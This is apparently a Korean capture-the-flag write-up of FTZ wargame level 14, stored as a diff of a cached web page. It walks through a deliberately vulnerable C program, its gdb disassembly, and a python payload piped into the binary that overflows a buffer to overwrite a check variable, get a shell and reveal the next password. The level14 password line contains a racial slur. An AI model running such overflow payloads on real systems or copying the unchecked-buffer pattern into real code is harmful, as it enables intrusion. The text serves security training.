@@ -1,0 +1,128 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level14 
+level14@~~~~<span class="s1">'s password: 
+[level14@ftz level14]$ ls 
+attackme  hint  public_html  tmp 
+[level14@ftz level14]$ cat hint 
+
+레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다. 
+버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이 
+최고의 효과를 가져다줍니다. 
+
+#include  &lt;stdio.h&gt;
+#include  &lt;unistd.h&gt;
+
+main() 
+{ int crap; 
+  int check; 
+  char buf[20]; 
+  fgets(buf,45,stdin); 
+  if (check==0xdeadbeef) 
+   { 
+     setreuid(3095,3095); 
+     system("/bin/sh"); 
+   } 
+} 
+
+[level14@ftz level14]$
+</span></code></pre></div></div>
+
+<p>level14/what that nigga want?로 접속하자.</p>
+
+<p>힌트를 보니 check의 값을 변경시켜야 문제를 풀 수 있을 것이다.</p>
+
+<p>소스를 컴파일해 gdb를 돌려보자.</p>
+
+<p>아, 소스에 한글이 있으므로 이건 지워줘야겠다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level14@ftz tmp]<span class="nv">$ </span>vi bof.c 
+<span class="o">[</span>level14@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>bof.c
+
+<span class="c">#include&lt;stdio.h&gt;</span>
+
+<span class="c">#include&lt;unistd.h&gt;</span>
+main<span class="o">()</span> 
+<span class="o">{</span> int crap<span class="p">;</span> 
+  int check<span class="p">;</span> 
+  char buf[20]<span class="p">;</span> 
+  fgets<span class="o">(</span>buf,45,stdin<span class="o">)</span><span class="p">;</span> 
+  <span class="k">if</span> <span class="o">(</span><span class="nv">check</span><span class="o">==</span>0xdeadbeef<span class="o">)</span> 
+   <span class="o">{</span> 
+     setreuid<span class="o">(</span>3095,3095<span class="o">)</span><span class="p">;</span> 
+     system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span><span class="p">;</span> 
+   <span class="o">}</span> 
+<span class="o">}</span> 
+
+<span class="o">[</span>level14@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
+<span class="o">[</span>level14@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>이제 gdb를 해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level14@ftz tmp]<span class="nv">$ </span>gdb bof 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x080483b8 &lt;main+0&gt;:    push   ebp 
+0x080483b9 &lt;main+1&gt;:    mov    ebp,esp 
+0x080483bb &lt;main+3&gt;:    sub    esp,0x38 
+0x080483be &lt;main+6&gt;:    and    esp,0xfffffff0 
+0x080483c1 &lt;main+9&gt;:    mov    eax,0x0 
+0x080483c6 &lt;main+14&gt;:   sub    esp,eax 
+0x080483c8 &lt;main+16&gt;:   sub    esp,0x4 
+0x080483cb &lt;main+19&gt;:   push   ds:0x80495d0 
+0x080483d1 &lt;main+25&gt;:   push   0x2d 
+0x080483d3 &lt;main+27&gt;:   lea    eax,[ebp-56] 
+0x080483d6 &lt;main+30&gt;:   push   eax 
+0x080483d7 &lt;main+31&gt;:   call   0x80482d8  &lt;fgets&gt;
+0x080483dc &lt;main+36&gt;:   add    esp,0x10 
+0x080483df &lt;main+39&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-16],0xdeadbeef 
+0x080483e6 &lt;main+46&gt;:   jne    0x804840d &lt;main+85&gt; 
+0x080483e8 &lt;main+48&gt;:   sub    esp,0x8 
+0x080483eb &lt;main+51&gt;:   push   0xc17 
+0x080483f0 &lt;main+56&gt;:   push   0xc17 
+0x080483f5 &lt;main+61&gt;:   call   0x80482f8  
+0x080483fa &lt;main+66&gt;:   add    esp,0x10 
+0x080483fd &lt;main+69&gt;:   sub    esp,0xc 
+0x08048400 &lt;main+72&gt;:   push   0x80484bc 
+<span class="nt">---Type</span>  to <span class="k">continue</span>, or q  to quit--- 
+0x08048405 &lt;main+77&gt;:   call   0x80482c8  &lt;system&gt;
+0x0804840a &lt;main+82&gt;:   add    esp,0x10 
+0x0804840d &lt;main+85&gt;:   leave 
+0x0804840e &lt;main+86&gt;:   ret 
+0x0804840f &lt;main+87&gt;:   nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span>
+</code></pre></div></div>
+
+<p>fgets에 들어오는 인좌를 보니 main+27에서 buf의 주소가 ebp-56인걸 알 수 있다.</p>
+
+<p>main+39에서 0xdeadbeef와 무언가를 비교하는게 보인다.</p>
+
+<p>C에서 check와 비교하는 코드일 것이다.</p>
+
+<p>그렇다면 check의 주소값이 ebp-16인 것을 알 수 있다.</p>
+
+<p>buf(ebp-56) - check(ebp-16) = 40</p>
+
+<p>그러므로 40개의 쓸모없는 값 뒤에 deadbeef를 넣으면 답이 나옴을 알 수 있다.</p>
+
+<p>가보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level14@ftz level14]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*40+"\xef\xbe\xad\xde"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme 
+<span class="nb">whoami 
+</span>level15
+my-pass
+Level15 Password is <span class="s2">"guess what"</span><span class="nb">.</span> 
+</code></pre></div></div>
+
+<p>전에 언급했듯이 프로그램을 실행과 동시에 인좌를 주는 것이 아니라 실행 후 입력이므로 cat과 파이프를 이용해 코드를 작성해야 한다.</p>
+
+<p>level15’s password:”guess what”</p>
+:ET
